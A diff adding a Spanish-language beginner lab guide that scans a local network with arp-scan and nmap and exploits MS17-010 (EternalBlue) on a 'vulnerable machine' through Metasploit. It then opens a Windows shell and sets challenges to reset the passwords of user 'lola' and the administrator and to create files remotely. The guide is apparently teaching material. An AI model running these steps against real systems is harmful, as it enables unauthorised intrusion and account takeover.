@@ -1,0 +1,38 @@
+antes de inicial kali linux
+asegurate de colocar el adaptador de red a modo puente y elige el adaptador de red que este conectado a internet, luego enciende la maquina virtual
+
+luego de encender kali linux, ejecuta los siguientes comandos:
+
+clear
+apt update -y && apt upgrade -y
+sudo arp-scan -I [nombre-interfaz] --localnet
+sudo nmap -sn [direccion-ip-de-red]/[prefijo-de-red]
+sudo nmap -sCV -p -vvv 135,139,445 [direccion-ip-de-red]/[prefijo-de-red]
+ping -c 1 [direccion-ip-maquina-vulnerable]
+sudo nmap -p445 --script smb-vuln-ms17-010 [direccion-ip-maquina-vulnerable]
+msfconsole
+search eternalblue
+use 0
+show options
+set RHOSTS [direccion-ip-maquina-vulnerable]
+show options
+exploit
+
+
+despues de haber establecido conexion con la maquina vulnerable, ejecuta el siguiente comando:
+shell
+
+finalmente, una vez que se ejecute el cmd de windows dentro de la seccion de meterpreter, puedes ejecutar los comandos de windows que quieras  en la maquina vulnerable
+
+aqui te dejo unos cuantos:
+whoami
+net user
+net localgroup
+ipconfig
+etc.
+
+retos a realizar:
+1. cambiale la clave al usuario lola y al usuario administrador
+2. accede a la carpeta documentos de cada usuario y crea una carpeta y un archivo con contenido.
+3. en la maquina vulnerable, verifiica los cambios que has realizado remotamente.
+4. cuentame tu experiencia de aprendizaje durante tu primer hackeo.
